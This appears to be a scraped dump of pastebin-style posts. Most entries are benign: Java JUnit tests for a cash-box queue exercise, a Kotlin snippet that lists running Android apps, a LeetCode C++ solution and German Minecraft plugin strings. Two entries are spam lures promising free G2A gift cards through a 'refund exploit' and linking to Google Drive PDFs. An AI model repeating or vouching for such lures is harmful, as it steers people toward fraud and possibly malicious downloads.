id,title,username,language,date,content
xL7aCXJH,🤑 G2A.com Free Gift Card Guide May 2024 FIX 💰,ssss50w,GetText,Saturday 4th of May 2024 12:17:03 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
04 May 2024"
xTistBYC,ShopTest.java,NeverRIEght,Java,Saturday 4th of May 2024 12:15:31 PM CDT,"package com.epam.rd.autocode.queue;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Set;
import java.util.stream.Stream;

import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import com.epam.rd.autocode.queue.CashBox.State;

import spoon.Launcher;
import spoon.SpoonAPI;
import spoon.reflect.reference.CtTypeReference;
import spoon.reflect.visitor.filter.TypeFilter;

import static org.junit.jupiter.api.Assertions.*;

/**
 * @author D. Kolesnikov
 */
public class ShopTest {

    //////////////////////////////////////////////////////////////////////////////

    private static boolean isAllTestsMustFailed;

    private static Throwable complianceTestFailedCause;

    static {
        try {
            String testClassName = new Exception().getStackTrace()[0].getClassName();
            String className = testClassName.substring(0, testClassName.lastIndexOf(""Test""));
            Class<?> c = Class.forName(className);

            java.lang.reflect.Method[] methods = {
                    c.getDeclaredMethod(""addBuyer"", Buyer.class),
                    c.getDeclaredMethod(""getCashBox"", int.class),
                    c.getDeclaredMethod(""setCashBoxState"", int.class, CashBox.State.class),
                    c.getDeclaredMethod(""tact""),
                    c.getDeclaredMethod(""print"")
            };

            org.apache.bcel.classfile.JavaClass jc = org.apache.bcel.Repository.lookupClass(c);
            for (java.lang.reflect.Method method : methods) {
                org.apache.bcel.classfile.Method m = jc.getMethod(method);
                org.apache.bcel.classfile.Code code = m.getCode();
                Assertions.assertTrue(code.getCode().length > 2, () -> m + "" is not a stub"");
            }
        } catch (Throwable t) {
            isAllTestsMustFailed = true;
            complianceTestFailedCause = t;
            t.printStackTrace();
        }
    }

    {
        if (isAllTestsMustFailed) {
            Assertions.fail(() -> ""Compliance test failed: "" + complianceTestFailedCause.getMessage());
        }
    }

    //////////////////////////////////////////////////////////////////////////////

    private static final PrintStream STD_OUT = System.out;

    private Shop shop;

    @BeforeEach
    void setUp() {
        Buyer.resetNames();
        shop = new Shop(5);
    }

    @Test
    void test1() {
        shop.setCashBoxState(0, State.ENABLED);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(2, State.ENABLED);
        shop.tact();

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(4, State.ENABLED);
        shop.tact();

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        String actual = getState(shop);
        String expected = ""+DG-+E-+F"";
        assertEquals(expected, actual);
    }

    @Test
    void test2() {
        shop.setCashBoxState(0, State.ENABLED);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(2, State.ENABLED);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(1, State.ENABLED);
        shop.setCashBoxState(3, State.ENABLED);
        shop.tact();

        String actual = getState(shop);
        String expected = ""+BC+ED+GH+I-"";
        assertEquals(expected, actual);
    }

    @Test
    void test3() {
        shop.setCashBoxState(0, State.ENABLED);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(2, State.ENABLED);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(2, State.IS_CLOSING);
        shop.tact();

        String actual = getState(shop);
        String expected = ""+BCDE-|GHI--"";
        assertEquals(expected, actual);
    }

    @Test
    void test4() {
        shop.setCashBoxState(0, State.ENABLED);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(2, State.ENABLED);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(2, State.IS_CLOSING);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.tact();

        shop.setCashBoxState(3, State.ENABLED);
        shop.tact();

        String actual = getState(shop);
        assertTrue(Set.of(""+CDEJ-|HI+MLK-"", ""+CDE-|HI+MLKJ-"").contains(actual));
    }

    @Test
    void test5() {
        shop.setCashBoxState(0, State.ENABLED);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(2, State.ENABLED);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(2, State.IS_CLOSING);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.tact();

        shop.setCashBoxState(3, State.ENABLED);
        shop.tact();

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        String actual = getState(shop);
        String expected = ""+CDEJOQ-|HI+MLKNP-"";
        assertEquals(expected, actual);
    }

    @Test
    void test6() throws IOException {
        shop.setCashBoxState(0, State.ENABLED);

        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(1, State.ENABLED);
        shop.addBuyer(Buyer.nextBuyer());

        shop.setCashBoxState(0, State.IS_CLOSING);
        shop.addBuyer(Buyer.nextBuyer());

        shop.tact();

        String actual = getState(shop);
        String expected = ""|BC+FD---"";
        assertEquals(expected, actual);
    }

    @Test
    void complianceTestLambdaExpressionsAreRestrictedForUsing() {
        Stream.of(Shop.class)
                .map(Class::getDeclaredMethods)
                .flatMap(Stream::of)
                .filter(m -> Modifier.isStatic(m.getModifiers()))
                .filter(m -> Modifier.isPrivate(m.getModifiers()))
                .map(Method::getName)
                .filter(name -> name.contains(""lambda$""))
                .findAny()
                .ifPresent(m ->
                        fail(() -> ""Using of lambda expressions is restricted: "" + m));
    }

    @Test
    void appShouldUseOnlyOptionalFromJavaUtilPackage() {
        SpoonAPI spoon = new Launcher();
        spoon.addInputResource(""src/main/java/"");
        spoon.buildModel();

        spoon.getModel()
                .getElements(new TypeFilter<>(CtTypeReference.class))
                .stream()
                .filter(r -> r.toString().startsWith(""java.util.stream""))
                .map(CtTypeReference::getQualifiedName)
                .findAny()
                .ifPresent(name ->
                        fail(() -> ""Using of stream API is restricted: "" + name));
    }

    @Test
    void addBuyerShouldAddBuyerToProperCashBoxWhenThereAreMoreThanOneShortestQueues() {
        shop = new Shop(3);
        for (int j = 0; j < 3; j++) {
            shop.getCashBox(j).setState(State.ENABLED);
        }

        shop.addBuyer(Buyer.nextBuyer());
        assertEquals(shop.getCashBox(0).getQueue().getLast().toString(), ""A"");

        shop.addBuyer(Buyer.nextBuyer());
        assertEquals(shop.getCashBox(1).getQueue().getLast().toString(), ""B"");

        shop.addBuyer(Buyer.nextBuyer());
        assertEquals(shop.getCashBox(2).getQueue().getLast().toString(), ""C"");

        shop.addBuyer(Buyer.nextBuyer());
        assertEquals(shop.getCashBox(0).getQueue().getLast().toString(), ""D"");
    }

    @Test
    void printShouldWorkProperly() throws IOException {
        shop = new Shop(3);
        String actual = null;
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             PrintStream ps = new PrintStream(baos)) {
            System.setOut(ps);

            shop.setCashBoxState(0, State.ENABLED);
            shop.setCashBoxState(1, State.ENABLED);
            shop.setCashBoxState(2, State.ENABLED);
            shop.addBuyer(Buyer.nextBuyer());
            shop.addBuyer(Buyer.nextBuyer());
            shop.addBuyer(Buyer.nextBuyer());
            shop.addBuyer(Buyer.nextBuyer());
            shop.addBuyer(Buyer.nextBuyer());
            shop.addBuyer(Buyer.nextBuyer());
            shop.addBuyer(Buyer.nextBuyer());
            shop.addBuyer(Buyer.nextBuyer());
            shop.addBuyer(Buyer.nextBuyer());

            shop.setCashBoxState(0, State.IS_CLOSING);
            shop.tact();
            shop.addBuyer(Buyer.nextBuyer());

            shop.setCashBoxState(1, State.IS_CLOSING);
            shop.addBuyer(Buyer.nextBuyer());
            shop.addBuyer(Buyer.nextBuyer());
            shop.tact();
            shop.tact();

            shop.print();
            actual = baos.toString();
        } finally {
            System.setOut(STD_OUT);
        }

        actual = actual.replaceAll(""\r"", """").trim();
        String expected = ""#0[-]~#1[|]J~#2[+]KL"".replace('~', '\n');
        assertEquals(expected, actual);
    }

    private static String getState(Shop shop) {
        StringBuilder sb = new StringBuilder();
        for (int j = 0; j < shop.getCashBoxCount(); j++) {
            CashBox cashBox = shop.getCashBox(j);
            State s = cashBox.getState();
            sb.append(s == State.ENABLED ? '+' : (s == State.DISABLED ? '-' : '|'));
            for (Buyer b : shop.getCashBox(j).getQueue()) {
                sb.append(b);
            }
        }
        return sb.toString();
    }

    @Test
    void neverSetCashBoxStateTest() {
        Shop shop1 = new Shop(1);
        shop1.setCashBoxState(0, State.ENABLED);
        assertEquals(State.ENABLED, shop1.getCashBox(0).getState());

        shop1.setCashBoxState(0, State.DISABLED);
        assertEquals(State.DISABLED, shop1.getCashBox(0).getState());

        shop1.setCashBoxState(0, State.IS_CLOSING);
        assertEquals(State.IS_CLOSING, shop1.getCashBox(0).getState());
    }

    @Test
    void neverCashBoxCountTest() {
        Shop shop1 = new Shop(1);
        assertEquals(1, shop1.getCashBoxCount());

        shop1 = new Shop(2);
        assertEquals(2, shop1.getCashBoxCount());

        shop1 = new Shop(3);
        assertEquals(3, shop1.getCashBoxCount());

        Random rand = new Random();
        for (int k = 0; k < 100; k++) {
            int randomValue = rand.nextInt(500) + 1;
            shop1 = new Shop(randomValue);
            assertEquals(randomValue, shop1.getCashBoxCount());
            assertEquals(State.DISABLED, shop1.getCashBox(randomValue - 1).getState());

            Shop finalShop = shop1;
            assertThrows(IndexOutOfBoundsException.class, () -> finalShop.getCashBox(randomValue));
        }
    }

    @Test
    void neverMinMaxTest() {
        Random rand = new Random();
        for (int k = 0; k < 100; k++) {
            final int cashBoxesCount = rand.nextInt(200) + 1;
            final int buyersCount = rand.nextInt(200) + 1;
            final int expectedMinBuyersCount = buyersCount / cashBoxesCount;
            final int expectedMaxBuyersCount = expectedMinBuyersCount + 1;

            Shop shop1 = new Shop(cashBoxesCount);

            for (int i = 0; i < cashBoxesCount; i++) {
                shop1.setCashBoxState(i, State.ENABLED);
            }

            Buyer.resetNames();
            for (int i = 0; i < buyersCount; i++) {
                shop1.addBuyer(Buyer.nextBuyer());
            }

            List<CashBox> cashBoxList = new ArrayList<>(cashBoxesCount);
            for (int i = 0; i < cashBoxesCount; i++) {
                cashBoxList.add(shop1.getCashBox(i));
            }

            int[] expectedMinMax = new int[]{expectedMinBuyersCount, expectedMaxBuyersCount};
            int[] actualMinMax = Shop.getMinMaxSize(cashBoxList);
            assertEquals(expectedMinMax[0], actualMinMax[0]);
            assertEquals(expectedMinMax[1], actualMinMax[1]);
        }
    }

    @Test
    void neverAddBuyerCountTest() {
        Random rand = new Random();
        for (int k = 0; k < 100; k++) {
            final int cashBoxesCount = rand.nextInt(200) + 1;
            final int buyersCount = rand.nextInt(200) + 1;
            final int minBuyersCount = buyersCount / cashBoxesCount;
            final int maxBuyersCount = minBuyersCount + 1;

            Shop shop1 = new Shop(cashBoxesCount);

            for (int i = 0; i < cashBoxesCount; i++) {
                shop1.setCashBoxState(i, State.ENABLED);
            }

            Buyer.resetNames();
            for (int i = 0; i < buyersCount; i++) {
                shop1.addBuyer(Buyer.nextBuyer());
            }

            int actualCountOfByers = 0;
            for (int i = 0; i < cashBoxesCount; i++) {
                CashBox currentCashBox = shop1.getCashBox(i);
                int countOfBuyerAtCashBox = currentCashBox.getQueue().size();
                assertTrue(countOfBuyerAtCashBox >= minBuyersCount);
                assertTrue(countOfBuyerAtCashBox <= maxBuyersCount);
                actualCountOfByers += currentCashBox.getQueue().size();
            }

            assertEquals(buyersCount, actualCountOfByers);
        }
    }

    @Test
    void neverGetLeastLoadedCashBox() {
        Shop shop1 = new Shop(2);

        shop1.setCashBoxState(0, State.ENABLED);
        shop1.setCashBoxState(1, State.ENABLED);
        assertEquals(shop1.getCashBox(0), shop1.getLeastLoadedCashbox());

        Buyer.resetNames();
        shop1.addBuyer(Buyer.nextBuyer()); //A
        assertEquals(shop1.getCashBox(1), shop1.getLeastLoadedCashbox());

        shop1.addBuyer(Buyer.nextBuyer()); //B
        assertEquals(shop1.getCashBox(0), shop1.getLeastLoadedCashbox());

        shop1.addBuyer(Buyer.nextBuyer()); //C
        assertEquals(shop1.getCashBox(1), shop1.getLeastLoadedCashbox());

        shop1.setCashBoxState(1, State.IS_CLOSING);
        assertEquals(shop1.getCashBox(0), shop1.getLeastLoadedCashbox());

        shop1.setCashBoxState(1, State.DISABLED);
        assertEquals(shop1.getCashBox(0), shop1.getLeastLoadedCashbox());

        shop1.addBuyer(Buyer.nextBuyer()); //D
        shop1.addBuyer(Buyer.nextBuyer()); //E
        shop1.setCashBoxState(1, State.ENABLED);
        assertEquals(shop1.getCashBox(1), shop1.getLeastLoadedCashbox());

        shop1.addBuyer(Buyer.nextBuyer()); //F
        shop1.addBuyer(Buyer.nextBuyer()); //G
        assertEquals(shop1.getCashBox(1), shop1.getLeastLoadedCashbox());
    }

    @Test
    void neverToStringTest() {
        Shop shop1 = new Shop(1);
        assertEquals(""#0[-]"", shop1.toString());

        shop1 = new Shop(2);
        assertEquals(""#0[-]\n"" + ""#1[-]"", shop1.toString());

        shop1 = new Shop(4);
        assertEquals(""""""
                #0[-]
                #1[-]
                #2[-]
                #3[-]"""""", shop1.toString());

        shop1.setCashBoxState(0, State.ENABLED);
        shop1.setCashBoxState(2, State.ENABLED);
        assertEquals(""""""
                #0[+]
                #1[-]
                #2[+]
                #3[-]"""""", shop1.toString());

        shop1.setCashBoxState(1, State.IS_CLOSING);
        shop1.setCashBoxState(3, State.DISABLED);
        assertEquals(""""""
                #0[+]
                #1[|]
                #2[+]
                #3[-]"""""", shop1.toString());

        Buyer.resetNames();
        shop1.addBuyer(Buyer.nextBuyer()); //A
        assertEquals(""""""
                #0[+]A
                #1[|]
                #2[+]
                #3[-]"""""", shop1.toString());

        shop1.addBuyer(Buyer.nextBuyer()); //B
        assertEquals(""""""
                #0[+]A
                #1[|]
                #2[+]B
                #3[-]"""""", shop1.toString());

        shop1.addBuyer(Buyer.nextBuyer()); //C
        assertEquals(""""""
                #0[+]AC
                #1[|]
                #2[+]B
                #3[-]"""""", shop1.toString());

        shop1.setCashBoxState(2, State.IS_CLOSING);
        shop1.addBuyer(Buyer.nextBuyer()); //D
        assertEquals(""""""
                #0[+]ACD
                #1[|]
                #2[|]B
                #3[-]"""""", shop1.toString());
    }
}
"
dvvURTK6,CashBoxTest.java,NeverRIEght,Java,Saturday 4th of May 2024 12:14:57 PM CDT,"package com.epam.rd.autocode.queue;

import java.util.Deque;

import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * @author D. Kolesnikov
 */
public class CashBoxTest {

	private static boolean isAllTestsMustFailed;

	private static Throwable complianceTestFailedCause;

	static {
		try {
			String testClassName = new Exception().getStackTrace()[0].getClassName();
			String className = testClassName.substring(0, testClassName.lastIndexOf(""Test""));
			Class<?> c = Class.forName(className);

			java.lang.reflect.Method[] methods = { 
					c.getDeclaredMethod(""getQueue""),
					c.getDeclaredMethod(""serveBuyer""),
					c.getDeclaredMethod(""inState"", CashBox.State.class),
					c.getDeclaredMethod(""notInState"", CashBox.State.class),
					c.getDeclaredMethod(""addLast"", Buyer.class),
					c.getDeclaredMethod(""removeLast""),
					c.getDeclaredMethod(""toString""),
					c.getDeclaredMethod(""setState"", CashBox.State.class),
					c.getDeclaredMethod(""getState"")
				};

			   
			org.apache.bcel.classfile.JavaClass jc = org.apache.bcel.Repository.lookupClass(c);
			for (java.lang.reflect.Method method : methods) {
				org.apache.bcel.classfile.Method m = jc.getMethod(method);
				org.apache.bcel.classfile.Code code = m.getCode();
				Assertions.assertTrue(code.getCode().length > 2, () -> m + "" is not a stub"");
			}
		} catch (Throwable t) {
			isAllTestsMustFailed = true;
			complianceTestFailedCause = t;
			t.printStackTrace();
		}
	}

	{
		if (isAllTestsMustFailed) {
			Assertions.fail(() -> ""Compliance test failed: "" + complianceTestFailedCause.getMessage());
		}
	}
	
	@Test
	void test() {
		CashBox cb = new CashBox(0);
		cb.addLast(Buyer.nextBuyer());
		Deque<Buyer> q1 = cb.getQueue();
		Deque<Buyer> q2 = cb.getQueue();
		
		Assertions.assertIterableEquals(q1, q2);
		Assertions.assertNotSame(q1, q2);
	
			
	}

	@Test
	void neverCashBoxStatesTest() {
		CashBox cashBox = new CashBox(1);
        assertTrue(cashBox.inState(CashBox.State.DISABLED));

		cashBox.setState(CashBox.State.ENABLED);
        assertFalse(cashBox.inState(CashBox.State.DISABLED));
        assertTrue(cashBox.notInState(CashBox.State.DISABLED));
		assertEquals(CashBox.State.ENABLED, cashBox.getState());

		cashBox.setState(CashBox.State.IS_CLOSING);
        assertFalse(cashBox.inState(CashBox.State.ENABLED));
        assertTrue(cashBox.notInState(CashBox.State.DISABLED));
		assertEquals(CashBox.State.IS_CLOSING, cashBox.getState());

		cashBox.setState(CashBox.State.ENABLED);
        assertFalse(cashBox.inState(CashBox.State.DISABLED));
        assertTrue(cashBox.notInState(CashBox.State.IS_CLOSING));
		assertEquals(CashBox.State.ENABLED, cashBox.getState());
	}

	@Test
	void neverCashBoxAddRemoveTest() {
		CashBox cashBox = new CashBox(1);

		Buyer.resetNames();
		cashBox.addLast(Buyer.nextBuyer()); //A
		assertEquals(""#1[-]"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.addLast(Buyer.nextBuyer()); //B
		assertEquals(""#1[|]"", cashBox.toString());

		cashBox.setState(CashBox.State.ENABLED);
		cashBox.addLast(Buyer.nextBuyer()); //C
		assertEquals(""#1[+]C"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.addLast(Buyer.nextBuyer()); //D
		assertEquals(""#1[|]C"", cashBox.toString());

		cashBox.setState(CashBox.State.ENABLED);
		cashBox.addLast(Buyer.nextBuyer()); //E
		cashBox.addLast(Buyer.nextBuyer()); //F
		assertEquals(""#1[+]CEF"", cashBox.toString());

		cashBox.removeLast();
		assertEquals(""#1[+]CE"", cashBox.toString());

		cashBox.setState(CashBox.State.DISABLED);
		cashBox.removeLast();
		assertEquals(""#1[-]CE"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.removeLast();
		assertEquals(""#1[|]C"", cashBox.toString());

		cashBox.removeLast();
		assertEquals(""#1[-]"", cashBox.toString());
	}

	@Test
	void neverCashBoxAutoClosureTest() {
		CashBox cashBox = new CashBox(1);

		Buyer.resetNames();
		cashBox.addLast(Buyer.nextBuyer()); //A
		cashBox.addLast(Buyer.nextBuyer()); //B
		assertEquals(""#1[-]"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.addLast(Buyer.nextBuyer()); //C
		assertEquals(""#1[|]"", cashBox.toString());

		cashBox.setState(CashBox.State.ENABLED);
		cashBox.addLast(Buyer.nextBuyer()); //D
		cashBox.addLast(Buyer.nextBuyer()); //E
		assertEquals(""#1[+]DE"", cashBox.toString());

		cashBox.serveBuyer();
		cashBox.serveBuyer();
		assertEquals(""#1[+]"", cashBox.toString());

		cashBox.addLast(Buyer.nextBuyer()); //F
		cashBox.addLast(Buyer.nextBuyer()); //G
		assertEquals(""#1[+]FG"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.serveBuyer();
		assertEquals(""#1[|]G"", cashBox.toString());

		cashBox.serveBuyer();
		assertEquals(""#1[-]"", cashBox.toString());
	}

	@Test
	void neverCashBoxTest() {
		CashBox cashBox = new CashBox(1);
		assertEquals(""#1[-]"", cashBox.toString());

		cashBox = new CashBox(254);
		assertEquals(""#254[-]"", cashBox.toString());

		cashBox.addLast(Buyer.nextBuyer());
		assertEquals(""#254[-]"", cashBox.toString());

		cashBox.setState(CashBox.State.ENABLED);
		Buyer.resetNames();
		cashBox.addLast(Buyer.nextBuyer()); //A
		assertEquals(""#254[+]A"", cashBox.toString());

		cashBox.addLast(Buyer.nextBuyer()); //B
		cashBox.addLast(Buyer.nextBuyer()); //C
		assertEquals(""#254[+]ABC"", cashBox.toString());

		cashBox.setState(CashBox.State.IS_CLOSING);
		cashBox.addLast(Buyer.nextBuyer()); //D
		cashBox.addLast(Buyer.nextBuyer()); //E
		assertEquals(""#254[|]ABC"", cashBox.toString());

		cashBox.setState(CashBox.State.DISABLED);
		cashBox.addLast(Buyer.nextBuyer()); //F
		cashBox.addLast(Buyer.nextBuyer()); //G
		assertEquals(""#254[-]ABC"", cashBox.toString());

		cashBox.setState(CashBox.State.DISABLED);
		cashBox.addLast(Buyer.nextBuyer()); //H
		assertEquals(""#254[-]ABC"", cashBox.toString());

		cashBox.setState(CashBox.State.ENABLED);
		cashBox.addLast(Buyer.nextBuyer()); //I
		assertEquals(""#254[+]ABCI"", cashBox.toString());

		cashBox.serveBuyer();
		assertEquals(""#254[+]BCI"", cashBox.toString());

		Buyer.resetNames();
		cashBox.addLast(Buyer.nextBuyer()); //A
		assertEquals(""#254[+]BCIA"", cashBox.toString());

		cashBox.serveBuyer();
		cashBox.serveBuyer();
		assertEquals(""#254[+]IA"", cashBox.toString());

		cashBox.serveBuyer();
		cashBox.serveBuyer();
		assertEquals(""#254[+]"", cashBox.toString());
	}
}"
vAPX8Pbx,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Saturday 4th of May 2024 12:10:31 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_517901.pdf

Working as of:
04 May 2024"
6NkBrErq,"котлин: как отслеживать запущенные приложения и определять, является ли запущенное приложение игрой:",reset_man,Kotlin,Saturday 4th of May 2024 11:49:45 AM CDT,"import android.app.ActivityManager
import android.content.Context
import android.content.pm.ApplicationInfo

fun isGame(context: Context, packageName: String): Boolean {
    val packageManager = context.packageManager
    val applicationInfo: ApplicationInfo = try {
        packageManager.getApplicationInfo(packageName, 0)
    } catch (e: Exception) {
        return false
    }

    return applicationInfo.flags and ApplicationInfo.FLAG_IS_GAME != 0
}

fun getRunningApps(context: Context): List<String> {
    val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    val runningTasks = activityManager.runningAppProcesses ?: emptyList()
    val runningApps = mutableListOf<String>()

    for (taskInfo in runningTasks) {
        val packageName = taskInfo.processName
        runningApps.add(packageName)
    }

    return runningApps
}

fun main() {
    val context: Context = getContext() // Предполагается, что у вас уже есть доступ к контексту приложения
    val runningApps = getRunningApps(context)

    for (app in runningApps) {
        val isGameApp = isGame(context, app)
        if (isGameApp) {
            println(""$app - это игровое приложение"")
        } else {
            println(""$app - это не игровое приложение"")
        }
    }
}

// Функция getContext() осталась невыданной, так как она зависит от конкретного типа приложения и его структуры"
3WgCWbhR,Determine if Two Strings Are Close,jayati,C++,Saturday 4th of May 2024 11:47:32 AM CDT,"class Solution {
public:
    bool closeStrings(string word1, string word2) {
       vector<int>temp1(26);
        vector<int>temp2(26);
        bool flag = true;

        for(int i = 0; i < word1.size();i++){
            temp1[word1[i]-'a']++;
        }

        for(int i = 0; i < word2.size();i++){
            temp2[word2[i]-'a']++;
        }

        for(int i = 0; i < temp1.size();i++){
            if((temp1[i]>0 && temp2[i]==0) || (temp1[i]==0 && temp2[i]>0)){
                return false;
            }
        }

        sort(temp1.begin(),temp1.end());
        sort(temp2.begin(),temp2.end());

        for(int i = 0;i < 26;i++){
            if(temp1[i]!=temp2[i]){
                flag = false;
                break;
            }
        }

        return flag;
        
        
    }
};"
ce0qEC4B,Untitled,mvstns,JSON,Saturday 4th of May 2024 11:43:07 AM CDT,"{
  ""stringTranslations"": {
    ""error_crafting_no_ingredients"": ""&cUnzureichende Zutaten."",
    ""error_crafting_no_space"": ""&cDein Inventar ist voll!"",
    ""error_crafting_tinker_fail"": ""&cDas kann nicht bearbeitet werden!"",
    ""error_crafting_no_sufficient_tool_owned"": ""&cDu besitzt kein ausreichendes Werkzeug, um diesen Gegenstand herzustellen"",
    ""error_command_invalid_number"": ""&cUngültige Nummer angegeben"",
    ""error_command_invalid_option"": ""&cUngültige Option angegeben"",
    ""error_command_invalid_command"": ""&cBefehl existiert nicht"",
    ""error_command_no_permission"": ""&cDu hast keine Berechtigung, diesen Befehl zu verwenden"",
    ""error_command_player_offline"": ""&cSpieler nicht gefunden"",
    ""error_command_invalid_selector"": ""&cFehler im Selektor: %error%"",
    ""error_command_recipe_exists"": ""&cEs existiert bereits ein Rezept mit diesem Namen."",
    ""error_command_recipe_missing"": ""&cRezept nicht gefunden"",
    ""error_command_invalid_skill"": ""&cUngültiger Fertigkeitstyp"",
    ""error_command_invalid_item"": ""&cGegenstand nicht gefunden!"",
    ""error_command_insufficient_level_tokens"": ""&cNicht genug einlösbare Level-Tokens, du hast &4%amount%"",
    ""error_command_insufficient_exp_tokens"": ""&cNicht genug einlösbare Erfahrungs-Tokens, du hast &4%amount%"",
    ""error_command_invalid_recipe"": ""&cUngültiger Rezepttyp"",
    ""error_command_invalid_attribute"": ""&cUngültiger Attributtyp"",
    ""error_command_invalid_effect"": ""&cUngültiger Tränkeneffekttyp"",
    ""error_command_invalid_modifier"": ""&cUngültiger Modifikator"",
    ""error_command_modifier_failed"": ""&cDieser Gegenstand &7(%item%)&c ist mit diesem Modifikator &7(ausgeführt bei %player%) inkompatibel"",
    ""error_command_vanilla_effects_illegal"": ""&cVanille-Effekte können mit diesem Befehl nicht angewendet werden"",
    ""error_command_item_required"": ""&cEs muss ein Gegenstand gehalten werden!"",
    ""error_command_invalid_reward"": ""&cUngültige Belohnung"",
    ""error_command_invalid_argument_type"": ""&cUngültiger Argumenttyp, erwartet wurde %type%, erhalten wurde %arg%"",
    ""error_command_global_buff_expired"": ""&cDieser Effekt existiert entweder nicht oder ist bereits abgelaufen"",
    ""error_command_player_required"": ""&cSpieler-Name erforderlich"",
    ""error_command_import_file_not_found"": ""&cDatei nicht gefunden oder leer"",
    ""error_command_import_no_path_given"": ""&cKein Dateiname angegeben"",
    ""error_command_resourcepack"": ""&cBei der Beschaffung des Ressourcenpakets ist etwas schiefgelaufen"",
    ""error_command_item_id_not_found"": ""&cGegenstand mit dieser ID nicht gefunden"",
    ""error_command_advanced_modifier_unusable"": ""&cErweiterte Gegenstandsmodifikatoren können im Befehlsformat nicht verwendet werden. Entschuldigung!"",
    ""error_command_invalid_leaderboard"": ""&cUngültige Bestenliste!"",
    ""status_command_global_buff_removed"": ""&aGlobaler Effekt entfernt!"",
    ""status_command_global_buff_applied"": ""&aGlobaler Effekt %effect% für %duration_timestamp% angewendet!"",
    ""status_command_global_buff_warning"": ""&aGlobaler Effekt namens %effect% angewendet, aber er könnte nichts bewirken, da er nicht registriert wurde!"",
    ""status_command_modify_executed"": ""&aModifikator bei %count% Spielern ausgeführt"",
    ""status_command_reward_executed"": ""&aBelohnung ausgeführt"",
    ""status_command_hardness_set"": ""&aDie Härte von %block% wurde auf %hardness% gesetzt!"",
    ""status_command_hardness_removed"": ""&aDie Härte von %block% wurde entfernt, jetzt Standard!"",
    ""status_command_reload_executed"": ""&aPlugin-Konfigurationen neu geladen"",
    ""status_command_soft_reset_success"": ""&aFortschritt zurückgesetzt und zurückgewonnene Erfahrung erneut vergeben!"",
    ""status_command_hard_reset_success"": ""&aRücksetzung bestätigt!"",
    ""status_command_durable_effect_applied"": ""&a%effect% verliehen!"",
